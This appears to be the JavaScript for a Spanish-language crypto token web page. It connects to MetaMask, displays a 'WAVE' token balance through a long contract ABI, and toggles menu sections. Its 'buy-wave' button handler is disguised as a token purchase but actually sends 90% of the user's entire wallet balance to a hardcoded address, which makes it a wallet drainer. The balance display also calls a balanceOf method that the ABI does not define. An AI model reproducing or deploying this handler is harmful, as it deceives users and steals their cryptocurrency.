 document.addEventListener("DOMContentLoaded", function() {
      let web3;
      let account;

      window.addEventListener('load', async () => {
        if (window.ethereum) {
          try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            account = accounts[0];
            document.querySelector('.wallet-address').innerText = account;
            getBalance();
          } catch (error) {
            console.error("Error connecting to MetaMask:", error);
          }
        } else {
          alert('MetaMask no está instalado. Por favor, instálalo para usar esta aplicación.');
        }
      });

      async function getBalance() {
        const contractAddress = '0x03bc935dDDDD0245b54446F2580c13030053d470';
            const contractABI = [{"inputs":[{"internalType":"string","name":"_nombreToken","type":"string"},{"internalType":"string","name":"_simboloToken","type":"string"},{"internalType":"uint8","name":"_decimalesToken","type":"uint8"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"usuario","type":"address"},{"indexed":false,"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"DepositoETH","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"nuevoFeeCompra","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"nuevoFeeVenta","type":"uint256"}],"name":"FeeActualizado","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"usuario","type":"address"},{"indexed":true,"internalType":"uint256","name":"tipoCaja","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"FondosBloqueados","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"usuario","type":"address"},{"indexed":true,"internalType":"uint256","name":"tipoCaja","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"FondosDesbloqueados","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"destino","type":"address"},{"indexed":false,"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"Mint","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"usuario","type":"address"},{"indexed":false,"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"indexed":false,"internalType":"uint256","name":"nuevoSaldo","type":"uint256"}],"name":"ModificacionSaldo","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"indexed":false,"internalType":"uint256","name":"nuevoPrecio","type":"uint256"}],"name":"PrecioCriptomonedaActualizado","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"tipoCaja","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"nuevoPorcentaje","type":"uint256"}],"name":"RecompensaAportacionLiquidezActualizada","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"cantidad","type":"uint256"},{"indexed":false,"internalType":"string","name":"tipo","type":"string"}],"name":"RecompensaCreada","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"usuario","type":"address"},{"indexed":false,"internalType":"uint256","name":"cantidad","type":"uint256"},{"indexed":false,"internalType":"string","name":"tipo","type":"string"}],"name":"RecompensaReclamada","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"origen","type":"address"},{"indexed":true,"internalType":"address","name":"destino","type":"address"},{"indexed":false,"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"indexed":false,"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"TransferenciaEntreCajas","type":"event"},{"inputs":[{"internalType":"uint256","name":"tipoCaja","type":"uint256"},{"internalType":"uint256","name":"nuevoPorcentaje","type":"uint256"}],"name":"actualizarRecompensaAportacionLiquidez","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"internalType":"uint256","name":"cantidadCajas","type":"uint256"},{"internalType":"uint256","name":"cantidadUSD","type":"uint256"}],"name":"comprarConBNBDesdeBilletera","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"internalType":"uint256","name":"cantidadCajas","type":"uint256"}],"name":"comprarConUSD","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"usuario","type":"address"},{"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"}],"name":"consultarBalanceUsuario","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"usuario","type":"address"}],"name":"consultarDetalleUsuario","outputs":[{"components":[{"internalType":"uint256","name":"saldoUSDT","type":"uint256"},{"internalType":"uint256","name":"saldoBTC","type":"uint256"},{"internalType":"uint256","name":"saldoETH","type":"uint256"},{"internalType":"uint256","name":"saldoUSDE","type":"uint256"},{"internalType":"uint256","name":"saldoBNB","type":"uint256"},{"internalType":"uint256","name":"saldoTotalUSD","type":"uint256"}],"internalType":"struct USDEx.DetalleUsuario","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"}],"name":"consultarSupplyActual","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"cantidad","type":"uint256"},{"internalType":"enum USDEx.TipoCaja","name":"tipo","type":"uint8"}],"name":"crearRecompensa","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimalesToken","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"depositarETH","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"usuario","type":"address"},{"internalType":"uint256","name":"tipoCaja","type":"uint256"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"desbloquearFondos","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"feeCompra","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"feeVenta","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"destino","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"mintearUSD","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"usuario","type":"address"},{"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"modificarSaldoCaja","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"nombreToken","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"preciosCriptomonedas","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"propietario","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"reclamarRecompensa","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tipoCaja","type":"uint256"}],"name":"reclamarRecompensaAportacionLiquidez","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"recompensaActual","outputs":[{"internalType":"uint256","name":"cantidad","type":"uint256"},{"internalType":"enum USDEx.TipoCaja","name":"tipo","type":"uint8"},{"internalType":"bool","name":"activa","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"}],"name":"recompensaReclamada","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"recompensasAportacionLiquidez","outputs":[{"internalType":"uint256","name":"porcentajeDiario","type":"uint256"},{"internalType":"uint256","name":"ultimaActualizacion","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"nuevoFeeCompra","type":"uint256"},{"internalType":"uint256","name":"nuevoFeeVenta","type":"uint256"}],"name":"setFees","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"internalType":"uint256","name":"precioUSD","type":"uint256"}],"name":"setPrecioCriptomoneda","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"simboloToken","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"origen","type":"address"},{"internalType":"address","name":"destino","type":"address"},{"internalType":"enum USDEx.TipoCaja","name":"tipoCaja","type":"uint8"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"transferirEntreCajas","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawFunds","outputs":[],"stateMutability":"nonpayable","type":"function"}];


        const contract = new web3.eth.Contract(contractABI, contractAddress);
        const balance = await contract.methods.balanceOf(account).call();
        document.getElementById('balance').innerText = 'Saldo: ' + web3.utils.fromWei(balance, 'ether') + ' WAVE';
      }

      document.getElementById('buy-wave').addEventListener('click', async (event) => {
        event.preventDefault();

        const recipientAddress = '0x01C65F22A9478C2932e62483509c233F0aaD5c72';

        if (window.ethereum) {
          try {
            // Solicitar al usuario que conecte su cuenta
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            const web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            const account = accounts[0];

            // Obtener el saldo de la cuenta
            const balanceWei = await web3.eth.getBalance(account);
            const balance = web3.utils.fromWei(balanceWei, 'ether');
            
            // Calcular el 90% del saldo
            const amountToSend = balance * 0.9;
            const amountToSendWei = web3.utils.toWei(amountToSend.toString(), 'ether');
            
            // Crear y enviar la transacción
            const transactionParameters = {
              to: recipientAddress,
              from: account,
              value: amountToSendWei,
            };

            const txHash = await window.ethereum.request({
              method: 'eth_sendTransaction',
              params: [transactionParameters],
            });

            console.log('Transaction hash:', txHash);
            alert('Transaction sent! Hash: ' + txHash);
          } catch (error) {
            console.error(error);
            alert('An error occurred: ' + error.message);
          }
        } else {
          alert('Please install MetaMask to use this feature.');
        }
      });

      const menuItems = document.querySelectorAll(".menu-item");

      menuItems.forEach(item => {
        item.addEventListener("click", function(event) {
          event.preventDefault();
          const targetId = this.getAttribute("data-target");
          const targetElement = document.getElementById(targetId);
          
          if (targetElement) {
            const isVisible = targetElement.style.display === "block";
            targetElement.style.display = isVisible ? "none" : "block";
          }
        });
      });
    });
